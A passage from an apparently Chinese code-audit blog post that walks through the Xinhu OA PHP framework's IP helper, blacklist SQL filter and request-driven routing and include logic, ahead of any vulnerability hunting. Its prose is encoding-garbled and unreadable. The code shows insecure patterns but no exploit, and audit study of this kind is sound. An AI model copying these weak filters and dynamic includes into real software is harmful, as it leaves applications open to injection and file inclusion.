<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ip</span>= <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">xssrepstr</span>(<span class="variable">$ip</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>)&#123;<span class="variable">$ipar</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$ip</span>);<span class="keyword">foreach</span>(<span class="variable">$ipar</span> <span class="keyword">as</span> <span class="variable">$ip1</span>)<span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$ip1</span>))<span class="variable">$ip</span>=<span class="string">&#x27;&#x27;</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$ip</span>)<span class="variable">$ip</span> = <span class="string">&#x27;unknow&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ip</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>iconvsql</code> æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">iconvsql</span>(<span class="params"><span class="variable">$str</span>,<span class="variable">$lx</span>=<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$this</span>-&gt;lvlaraa,<span class="variable">$this</span>-&gt;lvlarab,<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$lx</span>==<span class="number">1</span>) <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>),<span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>),<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>åŠŸèƒ½ä¸ä½œç”¨ï¼š</strong></p><ul><li>è¿™ä¸ªæ–¹æ³•ç”¨äºå¤„ç†å’Œæ¸…ç† SQL è¯­å¥ï¼Œä»¥é˜²æ­¢ SQL æ³¨å…¥æ”»å‡»ã€‚</li><li><code>str_ireplace($this-&gt;lvlaraa, $this-&gt;lvlarab, $str)</code> æ›¿æ¢æ‰å­—ç¬¦ä¸² <code>$str</code> ä¸­æ‰€æœ‰åœ¨ <code>$this-&gt;lvlaraa</code> æ•°ç»„ä¸­å®šä¹‰çš„SQLå…³é”®è¯ä¸º <code>$this-&gt;lvlarab</code> æ•°ç»„ä¸­ç›¸åº”çš„ç©ºå­—ç¬¦ä¸²ï¼Œè¿™ç§æ–¹æ³•ç”¨äºå°è¯•æ¸…é™¤å¯èƒ½å¯¼è‡´SQLæ³¨å…¥çš„è¯­å¥ã€‚</li><li><code>str_replace(&quot;\n&quot;, &#39;&#39;, $str)</code> ç§»é™¤å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰æ¢è¡Œç¬¦ã€‚</li><li>å¦‚æœå‚æ•° <code>$lx</code> ç­‰äº <code>1</code>ï¼Œåˆ™è¿›ä¸€æ­¥ç§»é™¤å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰ç©ºæ ¼å’Œåˆ¶è¡¨ç¬¦ã€‚è¿™å¯èƒ½ç”¨äºè¿›ä¸€æ­¥å‡å°‘ SQL è¯­å¥ä¸­ä¸å¿…è¦çš„ç©ºç™½ï¼Œä»¥å‡å°å…¶åœ¨æ•°æ®åº“æŸ¥è¯¢ä¸­çš„æ½œåœ¨å±é™©ã€‚</li></ul><p><code>unstr</code> æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">unstr</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ystr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$this</span>-&gt;unarr); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">contain</span>(<span class="variable">$str</span>, <span class="variable">$this</span>-&gt;unarr[<span class="variable">$i</span>]))&#123;</span><br><span class="line">            <span class="variable">$ystr</span> = <span class="variable language_">$this</span>-&gt;unarr[<span class="variable">$i</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ystr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>åŠŸèƒ½ä¸ä½œç”¨ï¼š</strong></p><ul><li>è¿™ä¸ªç§æœ‰æ–¹æ³•ç”¨äºæ£€æŸ¥å­—ç¬¦ä¸² <code>$str</code> æ˜¯å¦åŒ…å«åœ¨ç±»å˜é‡ <code>$this-&gt;unarr</code> å®šä¹‰çš„ç‰¹å®šå€¼ä¸­ã€‚</li><li>é€šè¿‡éå† <code>$this-&gt;unarr</code> æ•°ç»„ï¼Œå¹¶ä½¿ç”¨ <code>contain</code> æ–¹æ³•æ£€æŸ¥ <code>$str</code> æ˜¯å¦åŒ…å«æ•°ç»„ä¸­çš„ä»»ä½•ä¸€ä¸ªå…ƒç´ ã€‚å¦‚æœæ˜¯ï¼Œå°±å°†è¯¥å…ƒç´ èµ‹å€¼ç»™ <code>$ystr</code> å¹¶ç»ˆæ­¢å¾ªç¯ã€‚</li><li>è¿”å›çš„ <code>$ystr</code> ä¼šæ˜¯ <code>$str</code> ä¸­ç¬¬ä¸€ä¸ªåœ¨ <code>$this-&gt;unarr</code> æ•°ç»„ä¸­æ‰¾åˆ°åŒ¹é…çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™è¿”å›ç©ºå­—ç¬¦ä¸²ã€‚</li></ul><h2 id="å›åˆ°index"><a href="#å›åˆ°index" class="headerlink" title="å›åˆ°index"></a>å›åˆ°index</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;config/config.php&#x27;</span>);</span><br><span class="line"><span class="variable">$_uurl</span> = <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;rewriteurl&#x27;</span>);</span><br><span class="line"><span class="variable">$d</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$m</span> = <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;default&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_uurl</span> != <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>]);<span class="keyword">unset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]);<span class="keyword">unset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="variable">$m</span>= <span class="variable">$_uurl</span>;</span><br><span class="line"><span class="variable">$_uurla</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;_&#x27;</span>, <span class="variable">$_uurl</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_uurla</span>[<span class="number">1</span>]))&#123;<span class="variable">$d</span> = <span class="variable">$_uurla</span>[<span class="number">0</span>];<span class="variable">$m</span> = <span class="variable">$_uurla</span>[<span class="number">1</span>];&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_uurla</span>[<span class="number">2</span>]))&#123;<span class="variable">$d</span> = <span class="variable">$_uurla</span>[<span class="number">0</span>];<span class="variable">$m</span> = <span class="variable">$_uurla</span>[<span class="number">1</span>];<span class="variable">$a</span> = <span class="variable">$_uurla</span>[<span class="number">2</span>];&#125;</span><br><span class="line"><span class="variable">$_uurla</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;?&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_uurla</span>[<span class="number">1</span>]))&#123;</span><br><span class="line"><span class="variable">$_uurla</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;&amp;&#x27;</span>, <span class="variable">$_uurla</span>[<span class="number">1</span>]);<span class="keyword">foreach</span>(<span class="variable">$_uurla</span> <span class="keyword">as</span> <span class="variable">$_uurlas</span>)&#123;</span><br><span class="line"><span class="variable">$_uurlasa</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;=&#x27;</span>, <span class="variable">$_uurlas</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_uurlasa</span>[<span class="number">1</span>]))<span class="variable">$_GET</span>[<span class="variable">$_uurlasa</span>[<span class="number">0</span>]]=<span class="variable">$_uurlasa</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$m</span>= <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;index&#x27;</span>);</span><br><span class="line"><span class="variable">$d</span>= <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;default&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ajaxbool</span>= <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;ajaxbool&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);</span><br><span class="line"><span class="variable">$mode</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;m&#x27;</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$config</span>[<span class="string">&#x27;install&#x27;</span>] &amp;&amp; <span class="variable">$mode</span> != <span class="string">&#x27;install&#x27;</span>)<span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">location</span>(<span class="string">&#x27;?m=install&#x27;</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;include/View.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä¸»è¦æ¶‰åŠåŠ¨æ€ URL å¤„ç†å’Œé¡µé¢å¯¼èˆªé€»è¾‘çš„å¤„ç†ï¼ŒåŒ…æ‹¬æ¨¡å—ï¼ˆmï¼‰ã€åŠ¨ä½œï¼ˆaï¼‰å’Œæ•°æ®ï¼ˆdï¼‰çš„å‚æ•°æå–ã€‚è¿™æ ·çš„é€»è¾‘é€šå¸¸å‡ºç°åœ¨ MVC æ¡†æ¶æˆ–ç±»ä¼¼çš„åŠ¨æ€ Web åº”ç”¨ä¸­ï¼Œç”¨äºå†³å®šå“ªä¸ªæ§åˆ¶å™¨å’Œæ–¹æ³•åº”è¯¥è¢«è°ƒç”¨<br><img src="/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/image-1.png"><br>ç»“åˆè®¿é—®è¯·æ±‚ï¼Œå¯ä»¥çœ‹åˆ°è¿™äº›å‚æ•°å¯¹åº”ç€MVCæ¡†æ¶ä¸­çš„å†…å®¹<br>æœ€åä¸€è¡Œ<code>include_once(&#39;include/View.php&#39;);</code><br>è½¬è€Œçœ‹ä¸‹view.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$ajaxbool</span>))<span class="variable">$ajaxbool</span> = <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;ajaxbool&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);</span><br><span class="line"><span class="variable">$ajaxbool</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;ajaxbool&#x27;</span>, <span class="variable">$ajaxbool</span>);</span><br><span class="line"><span class="variable">$p</span>= PROJECT;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$m</span>))<span class="variable">$m</span>=<span class="string">&#x27;index&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$a</span>))<span class="variable">$a</span>=<span class="string">&#x27;default&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$d</span>))<span class="variable">$d</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$m</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;m&#x27;</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;a&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$d</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;d&#x27;</span>, <span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;M&#x27;</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;A&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;D&#x27;</span>, <span class="variable">$d</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;P&#x27;</span>, <span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_m</span>= <span class="variable">$m</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">contain</span>(<span class="variable">$m</span>, <span class="string">&#x27;|&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$_mas</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_mas</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$_m</span>= <span class="variable">$_mas</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">strformat</span>(<span class="string">&#x27;?0/?1/?1Action.php&#x27;</span>,ROOT_PATH, <span class="variable">$p</span>));</span><br><span class="line"><span class="variable">$rand</span>= <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,-<span class="number">1</span>)!=<span class="string">&#x27;/&#x27;</span> &amp;&amp; <span class="variable">$d</span>!=<span class="string">&#x27;&#x27;</span>)<span class="variable">$d</span>.=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$errormsg</span>= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$methodbool</span>= <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$actpath</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">strformat</span>(<span class="string">&#x27;?0/?1/?2?3&#x27;</span>,ROOT_PATH, <span class="variable">$p</span>, <span class="variable">$d</span>, <span class="variable">$_m</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;ACTPATH&#x27;</span>, <span class="variable">$actpath</span>);</span><br><span class="line"><span class="variable">$actfile</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">strformat</span>(<span class="string">&#x27;?0/?1Action.php&#x27;</span>,<span class="variable">$actpath</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="variable">$actfile1</span>= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">strformat</span>(<span class="string">&#x27;?0/?1Action.php&#x27;</span>,<span class="variable">$actpath</span>, <span class="variable">$_m</span>);</span><br><span class="line"><span class="variable">$actbstr</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$actfile1</span>))<span class="keyword">include_once</span>(<span class="variable">$actfile1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$actfile</span>))&#123;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$actfile</span>);</span><br><span class="line"><span class="variable">$clsname</span>= <span class="string">&#x27;&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;ClassAction&#x27;</span>;</span><br><span class="line"><span class="variable">$xhrock</span>= <span class="keyword">new</span> <span class="variable">$clsname</span>();</span><br><span class="line"><span class="variable">$actname</span>= <span class="string">&#x27;&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;Action&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ajaxbool</span> == <span class="string">&#x27;true&#x27;</span>)<span class="variable">$actname</span>= <span class="string">&#x27;&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;Ajax&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">method_exists</span>(<span class="variable">$xhrock</span>, <span class="variable">$actname</span>))&#123;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;<span class="title function_ invoke__">beforeAction</span>();</span><br><span class="line"><span class="variable">$actbstr</span> = <span class="variable">$xhrock</span>-&gt;<span class="variable">$actname</span>();</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;bodyMessage = <span class="variable">$actbstr</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$actbstr</span>))&#123;<span class="keyword">echo</span> <span class="variable">$actbstr</span>;<span class="variable">$xhrock</span>-&gt;display=<span class="literal">false</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$actbstr</span>))&#123;<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$actbstr</span>);<span class="variable">$xhrock</span>-&gt;display=<span class="literal">false</span>;&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$methodbool</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ajaxbool</span> == <span class="string">&#x27;false&#x27;</span>)<span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>.<span class="variable">$actname</span>.<span class="string">&#x27; not found;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;<span class="title function_ invoke__">afterAction</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;actionfile not exists;&#x27;</span>;</span><br><span class="line"><span class="variable">$xhrock</span>= <span class="keyword">new</span> <span class="title class_">Action</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_showbool</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$xhrock</span>-&gt;display &amp;&amp; (<span class="variable">$ajaxbool</span> == <span class="string">&#x27;html&#x27;</span> || <span class="variable">$ajaxbool</span> == <span class="string">&#x27;false&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;p&#x27;</span>]= <span class="variable">$p</span>;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;a&#x27;</span>]= <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;m&#x27;</span>]= <span class="variable">$m</span>;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;d&#x27;</span>]= <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;rand&#x27;</span>]= <span class="variable">$rand</span>;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;qom&#x27;</span>]= QOM;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;path&#x27;</span>]= PATH;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;sysurl&#x27;</span>]= SYSURL;</span><br><span class="line"><span class="variable">$temppath</span>= <span class="string">&#x27;&#x27;</span>.ROOT_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$p</span>.<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$tplpaths</span>= <span class="string">&#x27;&#x27;</span>.<span class="variable">$temppath</span>.<span class="string">&#x27;&#x27;</span>.<span class="variable">$d</span>.<span class="string">&#x27;&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$tplname</span>= <span class="string">&#x27;tpl_&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>!=<span class="string">&#x27;default&#x27;</span>)<span class="variable">$tplname</span>  .= <span class="string">&#x27;_&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$tplname</span>   .= <span class="string">&#x27;.&#x27;</span>.<span class="variable">$xhrock</span>-&gt;tpldom.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$mpathname</span>= <span class="variable">$tplpaths</span>.<span class="variable">$tplname</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$xhrock</span>-&gt;displayfile!=<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_exists</span>(<span class="variable">$xhrock</span>-&gt;displayfile))<span class="variable">$mpathname</span> = <span class="variable">$xhrock</span>-&gt;displayfile;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$mpathname</span>) || !<span class="variable">$methodbool</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$methodbool</span>)&#123;</span><br><span class="line"><span class="variable">$errormsg</span>= <span class="string">&#x27;in (&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;) not found Method(&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$errormsg</span>= <span class="string">&#x27;&#x27;</span>.<span class="variable">$tplname</span>.<span class="string">&#x27; not exists;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$errormsg</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$_showbool</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$xhrock</span>-&gt;display &amp;&amp; (<span class="variable">$ajaxbool</span> == <span class="string">&#x27;html&#x27;</span> || <span class="variable">$xhrock</span>-&gt;tpltype==<span class="string">&#x27;html&#x27;</span> || <span class="variable">$ajaxbool</span> == <span class="string">&#x27;false&#x27;</span>) &amp;&amp; <span class="variable">$_showbool</span>)&#123;</span><br><span class="line"><span class="variable">$xhrock</span>-&gt;<span class="title function_ invoke__">setHtmlData</span>();</span><br><span class="line"><span class="variable">$da</span> = <span class="variable">$xhrock</span>-&gt;smartydata;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$xhrock</span>-&gt;assigndata <span class="keyword">as</span> <span class="variable">$_k</span>=&gt;<span class="variable">$_v</span>)<span class="variable">$$_k</span>=<span class="variable">$_v</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$mpathname</span>);</span><br><span class="line"><span class="variable">$_showbool</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨äºåŠ¨æ€åŠ è½½å’Œæ‰§è¡Œ Web åº”ç”¨çš„è¡ŒåŠ¨ (action) è„šæœ¬ï¼Œå¤„ç† AJAX è¯·æ±‚ï¼Œå¹¶åŠ¨æ€åŠ è½½è§†å›¾æ¨¡æ¿ã€‚ä»£ç æ¶µç›–äº†ä»åˆå§‹åŒ–å˜é‡ã€ç¡®å®šæ‰§è¡Œå“ªä¸ªæ§åˆ¶å™¨çš„å“ªä¸ªåŠ¨ä½œï¼Œåˆ°åŠ è½½ç›¸åº”çš„ PHP æ–‡ä»¶ï¼Œä»¥åŠå¤„ç†å’Œè¾“å‡ºå“åº”ã€‚</p><p>okäº† æ˜ç™½æ¶æ„æ¨¡å¼äº† 